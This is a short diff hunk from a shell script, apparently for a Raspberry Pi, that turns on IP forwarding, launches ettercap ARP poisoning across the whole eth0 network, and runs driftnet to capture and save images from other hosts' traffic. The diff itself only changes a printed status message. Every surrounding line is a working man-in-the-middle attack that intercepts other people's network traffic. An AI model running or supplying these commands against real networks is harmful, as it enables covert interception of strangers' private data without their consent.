@@ -4,7 +4,7 @@ sudo mkdir localImages
 gif=$(find /home/pi/localImages/ -type f -name "*.gif")
 sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"  # setup port forwarding for arp poisoning
 sudo ettercap -T -Q -M arp -i eth0 // // &
-echo "$(tput bold)$(tput setaf 1)extract images & save$(tput sgr0)"
+echo "$(tput bold)$(tput setaf 1)extract images -x myImages & save$(tput sgr0)"
 sudo driftnet -v -i eth0 -a -m 100 -d localImages & # save 100 images
 while :
 do
